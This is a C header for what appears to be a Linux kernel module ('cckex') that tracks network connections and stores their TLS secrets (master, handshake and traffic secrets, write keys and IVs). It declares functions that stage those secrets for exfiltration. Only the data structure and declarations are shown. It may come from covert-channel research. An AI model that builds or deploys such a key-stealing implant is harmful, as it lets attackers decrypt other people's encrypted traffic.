#pragma once

#include <linux/skbuff.h>
#include <linux/slab.h>

typedef struct cckex_conn_list_entry {

	struct list_head list;

	// hostname of the target_ip
	char *hostname; 

	// ip of the remote host
	// currently not used
	uint8_t is_ipv4;
	union {
		void* remote_ip_raw;
		uint32_t *remote_ipv4;
		struct in6_addr *remote_ipv6;
	} ip;

	// port on the localhost which is used for the connection
	uint16_t local_port;
	// port on the remote host of the connection
	uint16_t remote_port;

	uint16_t cipher_suite;

	uint8_t *key_block;
	size_t key_block_size;

	uint8_t *client_random;
	size_t client_random_size;
	uint8_t *server_random;
	size_t server_random_size;

	// flag determines if master secret was already exfiltrated -> 1 = no, 0 = yes
	uint8_t exfil_master_secret;
	uint8_t *master_secret;
	size_t master_secret_size;

	uint8_t *handshake_secret;
	size_t handshake_secret_size;

	uint8_t exfil_server_secret;
	uint8_t *server_traffic_secret;
	size_t server_traffic_secret_size;
	uint8_t *server_handshake_secret;
	size_t server_handshake_secret_size;

	uint8_t *client_write_key;
	size_t client_write_key_size;
	uint8_t *client_write_iv;
	size_t client_write_iv_size;

	uint64_t tls13_seq_num;

} cckex_conn_list_entry_t;

void cckex_conn_list_reset(void);

void cckex_conn_list_add(cckex_conn_list_entry_t *entry);
void cckex_conn_list_del(cckex_conn_list_entry_t *entry);

cckex_conn_list_entry_t* cckex_conn_list_find_matching_remote_ip(void* ip, uint8_t is_ipv4);
cckex_conn_list_entry_t* cckex_conn_list_find_matching_port_pair(uint16_t local_port, uint16_t remote_port);
cckex_conn_list_entry_t* cckex_conn_list_find_matching_skb(struct sk_buff *skb, uint16_t remote_port);

int cckex_conn_set_ip(cckex_conn_list_entry_t *entry, void* ip, uint8_t is_ipv4);
int cckex_conn_set_ip_from_skb(cckex_conn_list_entry_t *entry, struct sk_buff *skb);

void cckex_conn_set_tls12_master_secret(uint8_t *client_random, size_t client_random_size, uint8_t *master_secret, size_t master_secret_size);
void cckex_conn_set_tls13_traffic_secret(uint8_t *client_random, size_t client_random_size, uint8_t *traffic_secret, size_t traffic_secret_size);
void cckex_conn_set_tls13_handshake_secret(uint8_t *client_random, size_t client_random_size, uint8_t *handshake_secret, size_t handshake_secret_size);

void cckex_conn_set_server_secret(uint8_t *client_random, size_t client_random_size, uint8_t *server_secret, size_t server_secret_size);
void cckex_conn_set_server_handshake_secret(uint8_t *client_random, size_t client_random_size, uint8_t *handshake_secret, size_t handshake_secret_size);

void cckex_stage_master_secret_for_exfil(cckex_conn_list_entry_t *entry);
void cckex_stage_server_secret_for_exfil(cckex_conn_list_entry_t *entry);
void cckex_try_stage_secrets(void);
